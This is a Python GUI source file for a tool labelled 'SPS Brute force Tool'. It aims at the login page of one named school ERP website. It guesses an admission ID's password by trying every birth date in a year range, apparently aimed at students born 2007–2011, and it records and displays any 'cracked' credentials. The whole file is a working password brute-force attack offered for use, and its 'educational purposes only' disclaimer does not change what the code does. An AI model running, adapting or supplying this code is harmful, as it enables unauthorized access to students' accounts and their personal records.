import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import requests
from bs4 import BeautifulSoup
import time
import threading
import webbrowser

class CustomMessageBox(tk.Toplevel):
    def __init__(self, title, message):
        super().__init__()
        self.title(title)

        label = tk.Label(self, text=message, font=('Arial', 14, 'bold'))
        label.pack(padx=20, pady=20)

        ok_button = tk.Button(self, text="OK", command=self.destroy)
        ok_button.pack(pady=10)

class SPSPurneaERP:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def get_verification_token(self, page_url):
        response = self.session.get(page_url)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        verification_token = soup.find('input', {'name': '__RequestVerificationToken'})

        if verification_token:
            return verification_token['value']
        else:
            raise ValueError("Unable to find __RequestVerificationToken on the page.")

    def perform_login(self, username, password):
        login_url = f"{self.base_url}/ERP"
        verification_token = self.get_verification_token(login_url)

        login_payload = {
            '__RequestVerificationToken': verification_token,
            'SessionName': '2023-2024',
            'LoginName': username,
            'Password': password,
        }

        login_response = self.session.post(login_url, data=login_payload)
        login_response.raise_for_status()

        return login_response

    def check_login_status(self, login_response):
        return 'Welcome' in login_response.text

    def save_login_response(self, login_response, password, admission_id, file_name='login_response.html'):
        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(login_response.text)

        if 'Welcome' in login_response.text:
            username = self.get_username_from_response(login_response.text)
            message = f"AdmissionID: {admission_id}\nPassword: {password}\nUsername: {username}"
            messagebox.showinfo("Login Successful", message)
            print(f'Successfully cracked the password for username: {username} password: {password}')
            webbrowser.open(file_name, new=2)

    def get_username_from_response(self, response_text):
        soup = BeautifulSoup(response_text, 'html.parser')
        welcome_message = soup.find('h2', string=lambda text: text and 'Welcome :' in text)

        if welcome_message:
            username = welcome_message.text.split('Welcome :')[1].strip()
            return username
        return ""

class TestingTool:
    def __init__(self, root):
        self.stop_event = None  # Initialize stop_event to None
        self.scheduled_task_id = None
        self.future = None
        
        self.stop_event = threading.Event()
        self.style = ttk.Style()
        self.style.theme_use("clam")

        root.title("SPS Brute force Tool")
        root.geometry("800x600")

        self.root = root       
        self.tab_control = ttk.Notebook(root)
        self.tab1 = ttk.Frame(self.tab_control)
        self.tab2 = ttk.Frame(self.tab_control)
        
        self.tab_control.add(self.tab1, text="Brute config")
        self.tab_control.add(self.tab2, text="Log")

        self.tab_control.pack(expand=1, fill="both")

        self.log_text = scrolledtext.ScrolledText(self.tab2, wrap=tk.WORD, width=80, height=20)
        self.log_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        toolbar = ttk.Frame(self.tab1)
        self.create_buttons(toolbar)
        self.create_input_labels()
        self.create_input_entries()
        self.create_label(toolbar)

        toolbar.grid(row=6, column=0, columnspan=2, pady=10)

        self.testing_started = False
        self.sps_erp = None
        self.progress_bar = ttk.Progressbar(self.tab1, mode="indeterminate", length=200)
        self.progress_bar.grid(row=8, column=0, columnspan=2, pady=10)

        
    def create_buttons(self, toolbar):
        buttons_info = [
            ("Start Brute Force", self.start_test),
            ("Stop Brute Force", self.stop_test),
            ("Export Log", self.export_log),
            ("Open Password File", self.open_password_file),
            ("Exit", self.root.destroy),
        ]

        for button_text, command in buttons_info:
            ttk.Button(toolbar, text=button_text, command=command).grid(row=5, column=buttons_info.index((button_text, command)), padx=5)

    def create_input_labels(self):
        labels_info = [
            ("Start Year:", 1),
            ("End Year:", 2),
            ("Admission ID:", 3),
            ("Threading:", 4),
        ]

        for label_text, row in labels_info:
            ttk.Label(self.tab1, text=label_text).grid(row=row, column=0, pady=10, padx=10, sticky="e")

    def create_input_entries(self):
        self.start_year_var = tk.StringVar(value="2007")
        self.end_year_var = tk.StringVar(value="2011")
        self.admission_id_var = tk.StringVar(value="p")
        self.threading_var = tk.StringVar(value="20")

        ttk.Entry(self.tab1, textvariable=self.start_year_var).grid(row=1, column=1, pady=10, padx=10, sticky="w")
        ttk.Entry(self.tab1, textvariable=self.end_year_var).grid(row=2, column=1, pady=10, padx=10, sticky="w")
        ttk.Entry(self.tab1, textvariable=self.admission_id_var).grid(row=3, column=1, pady=10, padx=10, sticky="w")
        ttk.Spinbox(self.tab1, from_=20, to=50, textvariable=self.threading_var).grid(row=4, column=1, pady=10, padx=10, sticky="w")

    def create_label(self, toolbar):
        ttk.Label(toolbar, text="Warning: Higher threading values consume more resources.", foreground="red").grid(row=4, column=0, columnspan=2, pady=10)
        disclaimer_text = (
            "Warning: Use this tool responsibly and at your own risk. "
            "RKGroup does not endorse or encourage any unauthorized activities. "
            "Unauthorized access to computer systems, networks, or any other property is illegal. "
            "Misuse of this tool may lead to legal consequences. "
            "It is your responsibility to comply with applicable laws and regulations. "
            "Be aware that activities performed using this tool may be against the terms of service "
            "of the targeted system, and such actions could result in severe penalties. "
            "The tool is provided for educational purposes only, and the user assumes all responsibility for its use."
        )
        disclaimer_label = ttk.Label(self.tab1, text=disclaimer_text, foreground="gray", font=('Arial', 8), wraplength=800)
        disclaimer_label.grid(row=15, column=0, columnspan=2, pady=10, padx=10, sticky="w")
    def start_test(self):
        if self.validate_input():
            self.stop_event.clear()  # Clear the stop event flag
            self.sps_erp = SPSPurneaERP(base_url='https://spspurnea.in')
            self.testing_started = True
            self.log_text.delete(1.0, tk.END)
            max_workers = int(self.threading_var.get())
            self.executor = ThreadPoolExecutor(max_workers=max_workers)
            self.future = self.executor.submit(self.check_login_status)
        else:
            messagebox.showerror("Input Error", "Invalid input. Please check your entries.")

    def run_testing_task(self):
        if self.testing_started:
            self.check_login_status(self.stop_event)  # Pass the stop_event to check_login_status
            self.scheduled_task_id = self.root.after(100, self.run_testing_task)

    def start_testing_thread(self):
        self.root.after(100, self.run_testing_thread)

    def run_testing_thread(self):
        if self.testing_started:
            self.progress_bar.start()
            # Pass progress_bar to the thread
            self.scheduled_task_id = self.root.after(100, self.run_testing_thread)
            self.check_login_status(self.stop_event)
        else:
            self.progress_bar.stop()

    def stop_test(self):
        if self.testing_started:
            self.testing_started = False
            self.stop_event.set()  # Set the stop event flag
            if self.future and not self.future.done():
                self.future.cancel()

    def check_login_status(self):
        with ThreadPoolExecutor(max_workers=1) as executor:
            start_year = int(self.start_year_var.get())
            end_year = int(self.end_year_var.get())
            admission_id = self.admission_id_var.get()

            date_list = generate_date_strings(start_year, end_year)
            for password in date_list:
                if not self.testing_started or (hasattr(self.stop_event, 'is_set') and self.stop_event.is_set()):
                    break

                future = executor.submit(check_credentials, admission_id, password, self.sps_erp, self.log_text, self.progress_bar, self.stop_event)
                try:
                    future.result()
                except Exception as e:
                    print(f"Exception in thread: {e}")

            if not self.testing_started:
                self.show_notification("Password not found in the list.")
            self.testing_started = False

    def validate_input(self):
        try:
            start_year = int(self.start_year_var.get())
            end_year = int(self.end_year_var.get())
            threading_value = int(self.threading_var.get())
            admission_id = self.admission_id_var.get()

            if not admission_id:
                raise ValueError("Admission ID cannot be empty.")

            if end_year < start_year:
                raise ValueError("End Year cannot be less than Start Year.")

            if threading_value < 20 or threading_value > 50:
                raise ValueError("Threading value must be between 20 and 50.")

            return True

        except ValueError as e:
            messagebox.showerror("Validation Error", str(e))
            return False

    def export_log(self):
        log_content = self.log_text.get(1.0, tk.END)
        file_name = f"log_export_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
        with open(file_name, 'w') as file:
            file.write(log_content)
        messagebox.showinfo("Log Exported", f"Log exported to {file_name}")

    def open_password_file(self):
        import subprocess
        subprocess.Popen(["notepad.exe", "date_list.txt"])

    def show_notification(self, message):
        self.root.after(0, lambda: messagebox.showinfo("Notification", message))

def check_credentials(username, password, sps_erp, log_text, progress_bar, stop_event):
    try:
        # Check stop event before performing any action
        if stop_event.is_set():
            return

        start_time = time.time()
        login_response = sps_erp.perform_login(username, password)
        elapsed_time = time.time() - start_time

        # Check stop event before updating UI
        if stop_event.is_set():
            return

        if sps_erp.check_login_status(login_response):
            success_message = f'Login successful with password: {password}, Time: {elapsed_time:.2f} seconds\n'
            print(success_message)
            log_text.insert(tk.END, success_message)
            sps_erp.save_login_response(login_response, password, username)
            stop_event.set()
        else:
            failure_message = f'Login failed with password: {password}, Time: {elapsed_time:.2f} seconds\n'
            print(failure_message)
            log_text.insert(tk.END, failure_message)

    except requests.RequestException as e:
        error_message = f"An error occurred during the login process: {e}\n"
        print(error_message)
        log_text.insert(tk.END, error_message)
        try:
            # Check stop event before performing any action
            if stop_event.is_set():
                return

            start_time = time.time()
            login_response = sps_erp.perform_login(username, password)
            elapsed_time = time.time() - start_time

            # Check stop event before updating UI
            if stop_event.is_set():
                return

            if sps_erp.check_login_status(login_response):
                success_message = f'Login successful with password: {password}, Time: {elapsed_time:.2f} seconds\n'
                print(success_message)
                log_text.insert(tk.END, success_message)
                sps_erp.save_login_response(login_response, password, username)
                stop_event.set()
            else:
                failure_message = f'Login failed with password: {password}, Time: {elapsed_time:.2f} seconds\n'
                print(failure_message)
                log_text.insert(tk.END, failure_message)

        except requests.RequestException as e:
            error_message = f"An error occurred again during the login process of password: {password}: {e}\n"
            print(error_message)
            log_text.insert(tk.END, error_message)
        finally:
            progress_bar.stop()


def generate_date_strings(start_year, end_year):
    date_strings = []
    start_date = datetime(start_year, 1, 1)
    end_date = datetime(end_year, 12, 31)
    current_date = start_date

    while current_date <= end_date:
        formatted_date = current_date.strftime('%d%m%Y')
        date_strings.append(formatted_date)
        current_date += timedelta(days=1)

    return date_strings

if __name__ == "__main__":
    root = tk.Tk()
    app = TestingTool(root)
    root.mainloop()
